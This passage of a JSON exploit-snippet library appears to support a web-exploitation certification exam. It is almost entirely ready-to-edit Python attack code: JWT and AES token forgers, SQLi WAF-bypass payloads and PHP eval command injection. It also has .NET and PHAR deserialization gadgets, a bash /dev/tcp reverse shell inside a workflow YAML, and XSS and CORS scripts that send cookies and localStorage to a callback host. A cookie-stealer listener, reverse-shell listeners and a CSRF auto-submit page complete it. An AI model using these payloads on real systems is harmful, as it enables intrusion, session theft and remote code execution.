"HS512\": hashlib.sha512}[ALG]\n\n    def b64url(data):\n        raw = json.dumps(data, separators=(\",\", \":\")).encode() if not isinstance(data, bytes) else data\n        return base64.urlsafe_b64encode(raw).decode().rstrip(\"=\")\n\n    signing_input = b64url(HEADER) + \".\" + b64url(PAYLOAD)\n    sig = hmac.new(SECRET, signing_input.encode(), DIGEST).digest()\n    token = signing_input + \".\" + base64.urlsafe_b64encode(sig).decode().rstrip(\"=\")\n    print(token)\n    return token\n"},{"id":"jwt-rsa-jku-jwk-shape","title":"Token - JWT JKU/JWK forge shape","category":"Token","kind":"function","functionName":"jwt_jku_jwk_commands","call":"jwt_jku_jwk_commands(cfg)","summary":"Prints OpenSSL/Python commands for attacker-hosted JWK/JKU JWT flow.","useWhen":"JWT verifier trusts `jku`, `jwk`, or attacker controlled key URL.","editFirst":["KID","JKU_PATH","PAYLOAD_JSON"],"aliases":["JWT","JWK","JKU","kid","RS256","jwks.json"],"code":"def jwt_jku_jwk_commands(cfg):\n    KID = \"oswe-key\"                        # EDIT\n    JKU_PATH = \"jwks.json\"                  # EDIT served from server_url\n    PAYLOAD_JSON = '{\"sub\":\"1\",\"role\":\"admin\"}'  # EDIT\n    print(\"# 1. Generate keypair\")\n    print(\"openssl genrsa -out loot/jwt.key 2048\")\n    print(\"openssl rsa -in loot/jwt.key -pubout -out loot/jwt.pub\")\n    print(\"# 2. Build JWKS from public key with your preferred tool/library\")\n    print(\"# 3. Serve loot/: python3 -m http.server 8000 --directory loot\")\n    print(\"# 4. JWT header should include:\")\n    print(json.dumps({\"typ\": \"JWT\", \"alg\": \"RS256\", \"kid\": KID, \"jku\": server_url(cfg, JKU_PATH)}, indent=2))\n    print(\"# 5. Payload:\")\n    print(PAYLOAD_JSON)\n"},{"id":"node-aes-json-token-forge","title":"Token - AES JSON token forge","category":"Token","kind":"function","functionName":"forge_aes_json_token","call":"forge_aes_json_token()","summary":"Shape for apps encrypting JSON tokens with AES-CBC/ECB.","useWhen":"Source shows AES key/IV and JSON token/cookie encryption.","editFirst":["MODE","KEY","IV","CLAIMS"],"aliases":["AES","CBC","ECB","crypto","cookie","encrypted token"],"code":"def forge_aes_json_token():\n    try:\n        from Crypto.Cipher import AES\n        from Crypto.Util.Padding import pad\n    except ImportError:\n        fail(\"install pycryptodome: pip install pycryptodome\")\n    MODE = \"CBC\"                            # EDIT CBC or ECB\n    KEY = b\"CHANGE_ME_16BYTE\"               # EDIT 16/24/32 bytes\n    IV = b\"CHANGE_ME_16BYTE\"                # EDIT for CBC\n    CLAIMS = {\"user\": \"admin\", \"role\": \"admin\"}  # EDIT\n\n    raw = json.dumps(CLAIMS, separators=(\",\", \":\")).encode()\n    if MODE == \"CBC\":\n        cipher = AES.new(KEY, AES.MODE_CBC, IV)\n    elif MODE == \"ECB\":\n        cipher = AES.new(KEY, AES.MODE_ECB)\n    else:\n        fail(\"bad MODE\")\n    token = base64.b64encode(cipher.encrypt(pad(raw, 16))).decode()\n    print(token)\n    return token\n"},{"id":"sqli-waf-regex-tester","title":"SQLi - WAF regex payload tester","category":"SQLi","kind":"function","functionName":"test_waf_regex_payloads","call":"test_waf_regex_payloads()","summary":"Local tester for WAF regex vs candidate SQLi payloads.","useWhen":"Source review shows WAF/CRS regex and you need shape that does not match.","editFirst":["REGEX","PAYLOADS"],"aliases":["WAF","regex101","Coraza","CRS","semicolon","bypass"],"code":"def test_waf_regex_payloads():\n    REGEX = r\"\"\"^(?:[^']*'|[^\"]*\"|[^\\x60]*\\x60)[\\s\\v]*;\"\"\"  # EDIT copy only regex, not @rx\n    PAYLOADS = [\n        \"admin'; SELECT 1-- -\",\n        \"admin' or 1=2; SELECT 1-- -\",\n        \"admin'/**/or/**/1=2; SELECT 1-- -\",\n    ]  # EDIT\n    rx = re.compile(REGEX)\n    for payload in PAYLOADS:\n        print(\"[MATCH]\" if rx.search(payload) else \"[OK   ]\", payload)\n"},{"id":"route-action-matrix","title":"HTTP - route/action matrix","category":"HTTP","kind":"function","functionName":"discover_route_action_matrix","call":"discover_route_action_matrix(session, cfg)","summary":"Tests word/action combinations with GET/POST/PUT/PATCH.","useWhen":"Source/router hints show actions under many controller paths.","editFirst":["WORDS","ACTIONS","METHODS","IGNORE_STATUS"],"aliases":["routes","actions","GET","POST","PUT","PATCH","wordlist"],"code":"def discover_route_action_matrix(session, cfg):\n    WORDS = [\"admin\", \"api\", \"user\"]        # EDIT or read file\n    ACTIONS = [\"create\", \"delete\", \"update\", \"debug\"]  # EDIT\n    METHODS = [\"GET\", \"POST\", \"PUT\", \"PATCH\"]          # EDIT\n    IGNORE_STATUS = {204, 401, 403, 404}    # EDIT\n\n    for word in WORDS:\n        for action in ACTIONS:\n            path = f\"/{word}/{action}\"\n            row = []\n            for method in METHODS:\n                r = session.request(method, url(cfg, path), timeout=cfg.timeout)\n                row.append(f\"{method}:{r.status_code}:{len(r.content)}\")\n            if any(int(x.split(\":\")[1]) not in IGNORE_STATUS for x in row):\n                print(path, \" \".join(row))\n"},{"id":"cache-poison-crlf-probes","title":"HTTP - cache poison / CRLF probes","category":"HTTP","kind":"function","functionName":"http_header_abuse_probes","call":"http_header_abuse_probes(session, cfg)","summary":"Small probes for Host/X-Forwarded cache keys and CRLF splitting.","useWhen":"Source/proxy layer trusts forwarded headers or reflects header values.","editFirst":["PATH","HEADERS_TO_TRY"],"aliases":["cache poisoning","CRLF","X-Forwarded-Host","Host","%0d%0a"],"code":"def http_header_abuse_probes(session, cfg):\n    PATH = \"/\"                              # EDIT\n    HEADERS_TO_TRY = [\n        {\"X-Forwarded-Host\": \"example.invalid\"},\n        {\"X-Original-URL\": \"/admin\"},\n        {\"X-Rewrite-URL\": \"/admin\"},\n        {\"User-Agent\": \"oswe%0d%0aX-Injected: yes\"},\n    ]  # EDIT\n    for headers in HEADERS_TO_TRY:\n        r = session.get(url(cfg, PATH), headers=headers, timeout=cfg.timeout)\n        interesting = {k: v for k, v in r.headers.items() if k.lower() in (\"location\", \"x-cache\", \"cache-control\", \"x-injected\")}\n        print(headers, r.status_code, interesting, r.text[:120])\n"},{"id":"php-eval-filter-runner","title":"RCE - PHP eval filter bypass runner","category":"RCE","kind":"function","functionName":"run_php_eval_filter_cmd","call":"run_php_eval_filter_cmd(session, cfg, 'id')","summary":"Builds command payload variants for filtered PHP eval sinks.","useWhen":"Source evals expression but filters obvious function names/chars.","editFirst":["PATH","PARAM","PAYLOADS"],"aliases":["PHP","eval","filter bypass","assert","system","Dolibarr-style"],"code":"def run_php_eval_filter_cmd(session, cfg, cmd):\n    PATH = \"/api/eval\"                      # EDIT\n    PARAM = \"expr\"                          # EDIT\n    PAYLOADS = [\n        \"system('__CMD__');\",\n        \"passthru('__CMD__');\",\n        \"('sys'.'tem')('__CMD__');\",\n        \"shell_exec('__CMD__');\",\n    ]  # EDIT\n    for template in PAYLOADS:\n        payload = template.replace(\"__CMD__\", cmd.replace(\"'\", \"\\\\'\"))\n        r = session.post(url(cfg, PATH), data={PARAM: payload}, timeout=cfg.timeout)\n        print(\"[try]\", payload, r.status_code, r.text[:300])\n        if r.status_code == 200 and r.text:\n            return r.text\n    fail(\"no eval payload worked\")\n"},{"id":"phpggc-phar-helper","title":"Deser - PHPGGC PHAR helper","category":"Deser","kind":"function","functionName":"phpggc_phar_commands","call":"phpggc_phar_commands()","summary":"Prints safe command templates for PHPGGC PHAR creation and trigger.","useWhen":"Source has PHP unserialize or file operation that touches phar://.","editFirst":["GADGET","CMD","OUTFILE"],"aliases":["PHPGGC","PHAR","phar://","unserialize","__destruct"],"code":"def phpggc_phar_commands():\n    GADGET = \"Vendor/Chain\"                 # EDIT phpggc -l\n    CMD = \"id\"                              # EDIT\n    OUTFILE = \"payload.phar\"                # EDIT\n    print(f\"phpggc {GADGET} system '{CMD}' -p phar -o {OUTFILE}\")\n    print(f\"# upload {OUTFILE}, then trigger a file operation on: phar:///path/to/{OUTFILE}/x\")\n"},{"id":"dotnet-xmlserializer-odp","title":".NET - XMLSerializer ODP payload","category":"Deser","kind":"function","functionName":"build_dotnet_odp_xml","call":"xml = build_dotnet_odp_xml('cmd.exe', '/c whoami')","summary":"Builds ObjectDataProvider-style XML payload shape.","useWhen":".NET XMLSerializer/DataContract path can instantiate gadget types.","editFirst":["method","arguments"],"aliases":[".NET","ObjectDataProvider","XMLSerializer","DataContractSerializer","Process.Start"],"code":"def build_dotnet_odp_xml(file_name=\"cmd.exe\", arguments=\"/c whoami\"):\n    xml = f'''<?xml version=\"1.0\"?>\n<root>\n  <!-- EDIT namespace/type wrapper to match target serializer -->\n  <ObjectDataProvider MethodName=\"Start\" ObjectType=\"System.Diagnostics.Process\">\n    <MethodParameters>\n      <String>{file_name}</String>\n      <String>{arguments}</String>\n    </MethodParameters>\n  </ObjectDataProvider>\n</root>'''\n    print(xml)\n    return xml\n"},{"id":"workflow-yaml-rce","title":"RCE - workflow YAML upload","category":"RCE","kind":"function","functionName":"build_workflow_yaml_revshell","call":"yaml_body = build_workflow_yaml_revshell(cfg)","summary":"Builds YAML workflow body with Groovy/Script command execution.","useWhen":"App accepts workflow/process YAML with script step or dependency resolver.","editFirst":["HOST","PORT","CMD"],"aliases":["YAML","workflow","groovy","reverse shell","process"],"code":"def build_workflow_yaml_revshell(cfg):\n    HOST = cfg.lhost or \"127.0.0.1\"         # EDIT\n    PORT = cfg.lport or 9001                # EDIT\n    CMD = f\"bash -c 'bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1'\"  # EDIT\n    body = f'''configuration:\n  dependencies: []\nflows:\n  default:\n    - script: groovy\n      body: |\n        def p = [\"bash\",\"-lc\",\"{CMD}\"].execute()\n        p.waitFor()\n'''\n    print(body)\n    return body\n"},{"id":"encoders-helper","title":"Helper - encoders","category":"Helpers","kind":"function","functionName":"encode_helpers_demo","call":"encode_helpers_demo('id')","summary":"Quick URL/base64/hex/PowerShell encodings for payload adaptation.","useWhen":"Payload needs quoting/encoding before HTTP, SQL, Windows, or JS context.","editFirst":["value"],"aliases":["base64","urlencode","hex","powershell","UTF-16LE","quote_plus"],"code":"def encode_helpers_demo(value):\n    raw = value.encode()\n    print(\"urlquote:\", quote(value))\n    print(\"quote_plus:\", quote_plus(value))\n    print(\"b64:\", base64.b64encode(raw).decode())\n    print(\"hex:\", binascii.hexlify(raw).decode())\n    print(\"ps-encoded:\", base64.b64encode(value.encode(\"utf-16le\")).decode())\n"},{"id":"smtp-token-sink","title":"Helper - SMTP token sink","category":"Helpers","kind":"function","functionName":"start_smtp_token_sink","call":"start_smtp_token_sink(2525)","summary":"Simple SMTP listener to catch reset links/tokens in lab setups.","useWhen":"App sends reset/verification emails to attacker-controlled SMTP sink.","editFirst":["port"],"aliases":["SMTP","password reset","email token","aiosmtpd","mail"],"code":"def start_smtp_token_sink(port=2525):\n    import asyncore\n    import smtpd\n\n    class Sink(smtpd.SMTPServer):\n        def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):\n            text = data.decode(errors=\"ignore\") if isinstance(data, bytes) else str(data)\n            print(\"[mail from]\", mailfrom, \"to\", rcpttos)\n            print(text)\n            for token in re.findall(r\"[A-Za-z0-9._~+/=-]{16,}\", text):\n                print(\"[candidate token]\", token)\n\n    print(f\"[+] SMTP sink on 0.0.0.0:{port}\")\n    Sink((\"0.0.0.0\", int(port)), None)\n    asyncore.loop()\n"},{"id":"source-review-grep-pack","title":"Helper - source review grep pack","category":"Helpers","kind":"function","functionName":"print_source_review_greps","call":"print_source_review_greps()","summary":"Prints high-signal grep regexes for Java/PHP/Node source review.","useWhen":"Start of white-box review, before writing exploit.py.","editFirst":[],"aliases":["grep","rg","source review","eval","exec","deser","sqli","xxe"],"code":"def print_source_review_greps():\n    patterns = {\n        \"java\": r\"Runtime\\.getRuntime\\(\\)\\.exec\\(|new ProcessBuilder\\(|readObject\\(|XMLDecoder|XStream|ScriptEngineManager|\\.eval\\(|createQuery\\(|createNativeQuery\\(|Statement\\.execute|DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|new URL\\(|openConnection\\(|getParameter\\(\",\n        \"php\": r\"eval\\s*\\(|assert\\s*\\(|system\\s*\\(|exec\\s*\\(|shell_exec\\s*\\(|passthru\\s*\\(|popen\\s*\\(|proc_open\\s*\\(|unserialize\\s*\\(|yaml_parse|simplexml_load|DOMDocument|XXE|include\\s*\\(|require\\s*\\(|\\$_(GET|POST|REQUEST|COOKIE|SERVER)|mysqli_query|pg_query|PDO\\(\",\n        \"node\": r\"eval\\(|new Function\\(|setTimeout\\([^,]*['\\\"\\x60]|child_process|\\.exec\\(|\\.spawn\\(|require\\(\\s*[^'\\\"]|__proto__|constructor\\.prototype|Object\\.assign\\(|\\.merge\\(|fs\\.readFile|res\\.(sendFile|download|render|redirect)|sequelize\\.query|knex\\.raw\",\n    }\n    for lang, pat in patterns.items():\n        print(f\"\\n[{lang}]\")\n        print(\"rg -n \" + repr(pat) + \" .\")\n"},{"id":"race-burst","title":"Logic - race burst","category":"Logic","kind":"function","functionName":"race_burst","call":"race_burst(session, cfg)","summary":"Envia o mesmo state-changing request muitas vezes em paralelo.","useWhen":"Bug depende de duas requests simultaneas: credit, coupon, reset, transfer.","editFirst":["METHOD","PATH","DATA","THREADS"],"aliases":["race","concurrent","burst","coupon","balance","negative amount"],"code":"def race_burst(session, cfg):\n    import concurrent.futures\n    METHOD = \"POST\"                        # EDIT\n    PATH = \"/api/action\"                   # EDIT\n    DATA = {\"amount\": \"10\"}                # EDIT\n    THREADS = 20                           # EDIT\n\n    def one(i):\n        r = session.request(METHOD, url(cfg, PATH), data=DATA, timeout=cfg.timeout)\n        return i, r.status_code, r.text[:120]\n\n    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as pool:\n        for i, status, body in pool.map(one, range(THREADS)):\n            print(i, status, body)\n"},{"id":"xss-cookie-exfil","title":"XSS - cookie/localStorage exfil","category":"XSS","kind":"function","functionName":"build_xss_cookie_exfil","call":"payload = build_xss_cookie_exfil(cfg)","summary":"Gera payload XSS com chunking para evitar truncation >1024 chars.","useWhen":"Stored/reflected XSS executa no browser da vitima/admin.","editFirst":["CALLBACK_PATH","CHUNK_SIZE"],"aliases":["XSS","document.cookie","localStorage","fetch","chunk","1024","exfiltrate"],"code":"def build_xss_cookie_exfil(cfg):\n    CALLBACK_PATH = \"callback\"             # EDIT\n    CHUNK_SIZE = 900                       # EDIT keep under proxy/log limits\n    cb = server_url(cfg, CALLBACK_PATH)\n    js = f\"\"\"\n<script>\nfunction sendChunks(label, data) {{\n  data = String(data || \"\");\n  for (let i = 0; i < data.length; i += {CHUNK_SIZE}) {{\n    fetch(\"{cb}?k=\" + encodeURIComponent(label) +\n          \"&i=\" + i +\n          \"&d=\" + encodeURIComponent(data.slice(i, i + {CHUNK_SIZE})), {{mode:\"no-cors\"}});\n  }}\n}}\nsendChunks(\"href\", location.href);\nsendChunks(\"cookie\", document.cookie);\nsendChunks(\"storage\", JSON.stringify(localStorage));\n</scr\"\"\" + \"\"\"ipt>\"\"\"\n    print(js)\n    return js\n"},{"id":"csrf-auto-submit","title":"CSRF - auto submit HTML","category":"CSRF","kind":"function","functionName":"build_csrf_auto_submit_html","call":"html = build_csrf_auto_submit_html(cfg)","summary":"Cria HTML auto-submit para endpoint state-changing.","useWhen":"Browser da vitima/admin tem cookies e endpoint nao valida CSRF.","editFirst":["ACTION_PATH","FIELDS","METHOD"],"aliases":["CSRF","auto submit","form","credentials include","SameSite"],"code":"def build_csrf_auto_submit_html(cfg):\n    ACTION_PATH = \"/admin/change\"          # EDIT\n    METHOD = \"POST\"                        # EDIT\n    FIELDS = {\"role\": \"admin\", \"enabled\": \"1\"}  # EDIT\n    inputs = \"\\n\".join(\n        f'<input type=\"hidden\" name=\"{k}\" value=\"{str(v).replace(chr(34), \"&quot;\")}\">'\n        for k, v in FIELDS.items()\n    )\n    html = f'''<!doctype html>\n<html><body>\n<form id=\"f\" method=\"{METHOD}\" action=\"{url(cfg, ACTION_PATH)}\">\n{inputs}\n</form>\n<script>document.getElementById(\"f\").submit();</scr''' + '''ipt>\n</body></html>'''\n    save_loot(\"csrf.html\", html)\n    return html\n"},{"id":"cors-fetch-exfil","title":"CORS - credentialed fetch exfil","category":"CORS","kind":"function","functionName":"build_cors_fetch_exfil_html","call":"html = build_cors_fetch_exfil_html(cfg)","summary":"HTML que faz fetch com credentials include e manda resultado para callback.","useWhen":"CORS permite Origin externo com credentials.","editFirst":["FETCH_URL","CALLBACK_PATH"],"aliases":["CORS","credentials include","Access-Control-Allow-Credentials","fetch exfil"],"code":"def build_cors_fetch_exfil_html(cfg):\n    FETCH_URL = url(cfg, \"/api/me\")        # EDIT\n    CALLBACK_PATH = \"cors\"                 # EDIT\n    cb = server_url(cfg, CALLBACK_PATH)\n    html = f'''<!doctype html>\n<html><body>\n<script>\nfetch(\"{FETCH_URL}\", {{credentials:\"include\"}})\n  .then(r => r.text())\n  .then(t => fetch(\"{cb}?d=\" + encodeURIComponent(t), {{mode:\"no-cors\"}}))\n  .catch(e => fetch(\"{cb}?e=\" + encodeURIComponent(String(e)), {{mode:\"no-cors\"}}));\n</scr''' + '''ipt>\n</body></html>'''\n    save_loot(\"cors_exfil.html\", html)\n    return html\n"},{"id":"proof-http-marker","title":"Proof - HTTP marker","category":"Proof","kind":"function","functionName":"proof_http_marker","call":"proof_http_marker(session, cfg)","summary":"Pedido final para provar user/flag/output.","useWhen":"No fim do exploit, valida que o estado final esta certo.","editFirst":["PROOF_PATH","MARKERS"],"aliases":["proof","flag","local.txt","proof.txt","whoami","final"],"code":"def proof_http_marker(session, cfg):\n    PROOF_PATH = \"/api/me\"                 # EDIT\n    MARKERS = []                           # EDIT e.g. [\"admin\", \"proof\"]\n\n    r = session.get(url(cfg, PROOF_PATH), timeout=cfg.timeout)\n    debug(cfg, \"proof\", r.status_code, r.text[:500])\n    for marker in MARKERS:\n        check(marker in r.text, f\"missing proof marker: {marker}\")\n    print(\"[+] proof status:\", r.status_code)\n    print(r.text[:1000])\n    return r.text\n"},{"id":"helper-start-file-server","title":"Helper - embedded file server","category":"Helpers","kind":"function","functionName":"start_file_server","call":"server = start_file_server('data', 'payload.txt', 8081)","summary":"Servidor HTTP local em thread para DTD/payload/download.","useWhen":"Exploit precisa servir DTD, webshell, payload, YAML, jar, etc.","editFirst":["filename","port"],"aliases":["http.server","DTD","payload server","callback","serve file"],"code":"def start_file_server(content, filename=\"payload.bin\", port=8081):\n    import http.server\n    import threading\n\n    if isinstance(content, str):\n        content = content.encode()\n\n    class Handler(http.server.BaseHTTPRequestHandler):\n        def do_GET(self):\n            requested = os.path.basename(self.path.split(\"?\")[0])\n            if requested != filename:\n                self.send_error(404)\n                return\n            self.send_response(200)\n            self.send_header(\"Content-Length\", str(len(content)))\n            self.end_headers()\n            self.wfile.write(content)\n        def log_message(self, fmt, *args):\n            pass\n\n    server = http.server.HTTPServer((\"0.0.0.0\", int(port)), Handler)\n    threading.Thread(target=server.serve_forever, daemon=True).start()\n    print(f\"[+] serving {filename} on {port}\")\n    return server\n"},{"id":"helper-http-collector","title":"Helper - HTTP callback collector","category":"Helpers","kind":"function","functionName":"start_http_collector","call":"start_http_collector(cfg)","summary":"Listener simples que imprime GET/POST e query/body.","useWhen":"XSS/SSRF/XXE/OOB precisa apanhar callbacks.","editFirst":["cfg.server_port","port"],"aliases":["listener","collector","callback","GET","POST","exfil","server-port"],"code":"def start_http_collector(cfg=None, port=None):\n    import http.server\n\n    # Default exam use:\n    #   python3 exploit.py -t http://target --server-host ATTACKER_IP --server-port 8000\n    #   start_http_collector(cfg)\n    #\n    # Quick standalone use:\n    #   start_http_collector(port=8000)\n    if port is None:\n        if cfg is not None and hasattr(cfg, \"server_port\") and cfg.server_port:\n            port = cfg.server_port\n        elif cfg is not None and isinstance(cfg, int):\n            port = cfg\n        else:\n            port = 8000\n\n    class Handler(http.server.BaseHTTPRequestHandler):\n        def do_GET(self):\n            print(\"[GET]\", self.path)\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b\"ok\")\n        def do_POST(self):\n            length = int(self.headers.get(\"Content-Length\", \"0\"))\n            body = self.rfile.read(length)\n            print(\"[POST]\", self.path, body[:2000])\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b\"ok\")\n\n    print(f\"[+] listening on 0.0.0.0:{port}\")\n    http.server.HTTPServer((\"0.0.0.0\", int(port)), Handler).serve_forever()\n"},{"id":"helper-cookie-stealer","title":"Helper - XSS cookie stealer","category":"XSS","kind":"function","functionName":"start_cookie_stealer","call":"admin_cookie = start_cookie_stealer(cfg, 'PHPSESSID')","summary":"HTTP listener that captures raw, URL-encoded, or base64 document.cookie and returns one cookie value.","useWhen":"Stored/reflected XSS sends document.cookie to your HTTP listener.","editFirst":["cookie_name","QUERY_KEYS","AUTO_B64_DECODE","cfg.server_port"],"aliases":["XSS","cookie stealer","document.cookie","PHPSESSID","JSESSIONID","server-port","admin cookie","/cookie=","?cookie=","?c=","btoa"],"code":"def start_cookie_stealer(cfg, cookie_name):\n    import base64\n    import http.server\n    from urllib.parse import parse_qs, unquote, urlparse\n\n    # XSS shapes accepted:\n    #   /?c=PHPSESSID=abc\n    #   /cookie=VALUE\n    #   /log?cookie=VALUE\n    #   /cookie=BASE64(document.cookie)\n    # Example payload:\n    #   <script>fetch(\"http://ATTACKER:8000/?c=\"+encodeURIComponent(document.cookie))</scr\"+\"ipt>\n    #   <script>fetch(\"http://ATTACKER:8000/cookie=\"+encodeURIComponent(btoa(document.cookie)))</scr\"+\"ipt>\n    # Run:\n    #   python3 exploit.py -t http://target --server-host ATTACKER_IP --server-port 8000\n    #   admin_sid = start_cookie_stealer(cfg, \"PHPSESSID\")\n    check(cfg.server_port, \"set --server-port\")\n    port = cfg.server_port\n    QUERY_KEYS = [cookie_name, \"cookie\", \"c\"]  # EDIT accepted query keys\n    AUTO_B64_DECODE = True                     # EDIT handles btoa(document.cookie)\n\n    captured = {\"value\": None}\n\n    def parse_cookie_string(raw):\n        values = {}\n        for part in raw.split(\";\"):\n            part = part.strip()\n            if \"=\" in part:\n                k, v = part.split(\"=\", 1)\n                values[k.strip()] = v.strip()\n        return values\n\n    def maybe_decode(raw):\n        values = [raw]\n        if AUTO_B64_DECODE:\n            try:\n                decoded = base64.b64decode(raw + \"=\" * (-len(raw) % 4)).decode(errors=\"ignore\")\n                if \"=\" in decoded:\n                    values.append(decoded)\n            except Exception:\n                pass\n        return values\n\n    def extract_value(raw):\n        raw = unquote(raw or \"\")\n        if not raw:\n            return \"\"\n        if cookie_name in (\"cookie\", \"c\", \"raw\"):\n            return raw\n        for candidate in maybe_decode(raw):\n            cookies = parse_cookie_string(candidate)\n            if cookie_name in cookies:\n                return cookies[cookie_name]\n        return raw\n\n    class Handler(http.server.BaseHTTPRequestHandler):\n        def do_GET(self):\n            parsed = urlparse(self.path)\n            qs = parse_qs(parsed.query)\n            raw = \"\"\n            for key in QUERY_KEYS:\n                raw = qs.get(key, [\"\"])[0]\n                if raw:\n                    break\n\n            if not raw:\n                for key in QUERY_KEYS:\n                    prefix = \"/\" + key + \"=\"\n                    if parsed.path.startswith(prefix):\n                        raw = parsed.path.split(prefix, 1)[1]\n                        break\n\n            value = extract_value(raw)\n\n            print(\"[GET]\", self.path)\n            if value:\n                captured[\"value\"] = value\n                print(f\"[+] {cookie_name}:\", value)\n\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b\"ok\")\n\n        def log_message(self, fmt, *args):\n            pass\n\n    server = http.server.HTTPServer((\"0.0.0.0\", int(port)), Handler)\n    print(f\"[+] XSS stealer on 0.0.0.0:{port}, key={cookie_name}\")\n    print(\"[*] waiting for XSS callback...\")\n    while not captured[\"value\"]:\n        server.handle_request()\n    server.server_close()\n    return captured[\"value\"]\n"},{"id":"helper-tcp-listener","title":"Helper - TCP listener like nc","category":"Helpers","kind":"function","functionName":"listen_tcp_once","call":"listen_tcp_once(cfg)","summary":"Single-connection TCP listener that binds locally on 0.0.0.0 for callbacks or reverse shells.","useWhen":"You would normally run `nc -lvnp PORT`; --lhost is the callback IP used in the payload, not the bind IP.","editFirst":["--lhost","--lport","BIND_HOST","INTERACTIVE","SEND_FIRST"],"aliases":["nc -lvnp","netcat","reverse shell","callback","socket","listener","lhost","lport","0.0.0.0","bind","Errno 99"],"code":"def listen_tcp_once(cfg):\n    import select\n    import socket\n    import sys\n\n    check(cfg.lport, \"set --lport\")\n    BIND_HOST = \"0.0.0.0\"                 # EDIT bind locally; avoids Errno 99 for callback-only IPs\n    CALLBACK_HOST = cfg.lhost or \"ATTACKER_IP\"  # EDIT payload should connect here\n    PORT = cfg.lport\n    INTERACTIVE = True                    # EDIT False just prints received data\n    SEND_FIRST = \"\"                       # EDIT optional first command/data\n\n    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    srv.bind((BIND_HOST, int(PORT)))\n    srv.listen(1)\n    print(f\"[+] listening on {BIND_HOST}:{PORT} (payload -> {CALLBACK_HOST}:{PORT})\")\n\n    conn, addr = srv.accept()\n    print(f\"[+] connection from {addr[0]}:{addr[1]}\")\n    if SEND_FIRST:\n        conn.sendall(SEND_FIRST.encode() + b\"\\n\")\n\n    try:\n        while True:\n            readers = [conn, sys.stdin] if INTERACTIVE else [conn]\n            ready, _, _ = select.select(readers, [], [])\n            if conn in ready:\n                data = conn.recv(4096)\n                if not data:\n                    break\n                print(data.decode(errors=\"replace\"), end=\"\")\n            if INTERACTIVE and sys.stdin in ready:\n                cmd = sys.stdin.readline()\n                if not cmd:\n                    break\n                conn.sendall(cmd.encode())\n    finally:\n        conn.close()\n        srv.close()\n"},{"id":"helper-tcp-listener-thread","title":"Helper - TCP listener thread","category":"Helpers","kind":"function","functionName":"start_tcp_listener_thread","call":"listener = start_tcp_listener_thread(cfg)","summary":"Starts a 0.0.0.0/cfg.lport TCP listener in a background thread so the same script can trigger the callback.","useWhen":"Upload or RCE needs the same terminal to listen first, then send the HTTP trigger.","editFirst":["--lhost","--lport","USE_NC","BIND_HOST","wait_seconds","listener.join()"],"aliases":["thread","threading","listen_tcp_once","reverse shell","same terminal","listener.join","trigger shell","0.0.0.0","bind","Errno 99","nc -lvnp","subprocess.run"],"code":"def start_tcp_listener_thread(cfg, wait_seconds=0.7):\n    import select\n    import socket\n    import subprocess\n    import sys\n    import threading\n    import time\n\n    # Use when: one exploit.py must start listener, trigger payload, then keep shell.\n    # Edit first: --lhost/--lport and wait_seconds if target is slow.\n    # Run: python3 exploit.py -t http://target --lhost ATTACKER_IP --lport 4444\n    # main.py use:\n    #   shell_url = upload_webshell(session, cfg)\n    #   listener = start_tcp_listener_thread(cfg)\n    #   try:\n    #       session.get(shell_url, timeout=2)\n    #   except requests.exceptions.ReadTimeout:\n    #       pass\n    #   listener.join()\n    check(cfg.lport, \"set --lport\")\n    USE_NC = True                          # EDIT True on Kali for real nc interactivity\n    BIND_HOST = \"0.0.0.0\"                 # EDIT bind locally; cfg.lhost is only for payload callback\n    CALLBACK_HOST = cfg.lhost or \"ATTACKER_IP\"\n    PORT = cfg.lport\n    INTERACTIVE = True                    # EDIT False just prints received data\n    SEND_FIRST = \"\"                       # EDIT optional first command/data\n\n    def listen():\n        if USE_NC:\n            try:\n                print(f\"[+] starting nc -lvnp {PORT} (payload -> {CALLBACK_HOST}:{PORT})\")\n                subprocess.run([\"nc\", \"-lvnp\", str(PORT)])\n                return\n            except FileNotFoundError:\n                print(\"[!] nc not found; falling back to Python socket listener\")\n\n        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        srv.bind((BIND_HOST, int(PORT)))\n        srv.listen(1)\n        print(f\"[+] listening on {BIND_HOST}:{PORT} (payload -> {CALLBACK_HOST}:{PORT})\")\n\n        conn, addr = srv.accept()\n        print(f\"[+] connection from {addr[0]}:{addr[1]}\")\n        if SEND_FIRST:\n            conn.sendall(SEND_FIRST.encode() + b\"\\n\")\n\n        try:\n            while True:\n                readers = [conn, sys.stdin] if INTERACTIVE else [conn]\n                ready, _, _ = select.select(readers, [], [])\n                if conn in ready:\n                    data = conn.recv(4096)\n                    if not data:\n                        break\n                    print(data.decode(errors=\"replace\"), end=\"\")\n                if INTERACTIVE and sys.stdin in ready:\n                    cmd = sys.stdin.readline()\n                    if not cmd:\n                        break\n                    conn.sendall(cmd.encode())\n        finally:\n            conn.close()\n            srv.close()\n\n    listener = threading.Thread(target=listen, daemon=False)\n    listener.start()\n    time.sleep(wait_seconds)\n    return listener\n"},{"id":"helper-regex-extract","title":"Helper - regex extract one","category":"Helpers","kind":"function","functionName":"extract_one","call":"value = extract_one(text, r'token=([^&]+)')","summary":"Extrai primeiro grupo e falha de forma limpa.","useWhen":"CSRF, token, id, path, marker, appdata.","editFirst":["pattern"],"aliases":["regex","extract","csrf","token","marker","re.search"],"code":"def extract_one(text, pattern, flags=0, name=\"value\"):\n    m = re.search(pattern, text, flags)\n    check(m, f\"{name} not found with regex: {pattern}\")\n    return m.group(1)\n"},{"id":"helper-run-external-tool","title":"Helper - run external command","category":"Helpers","kind":"function","functionName":"run_external","call":"tokens = run_external(['php', 'token.php', str(start_ms), str(stop_ms)], timeout=60, mode='lines')","summary":"Runs any external command and returns stdout as raw text, lines, first line, or JSON.","useWhen":"You have PHP/Java/Node/C/etc code from source review and want Python exploit.py to use its output.","editFirst":["cmd","timeout","mode"],"aliases":["subprocess.run","php token.php","java","node","go run","gcc","dotnet","stdout","raw","lines","first","json"],"code":"def run_external(cmd, timeout=30, mode=\"lines\"):\n    import subprocess\n\n    # mode:\n    #   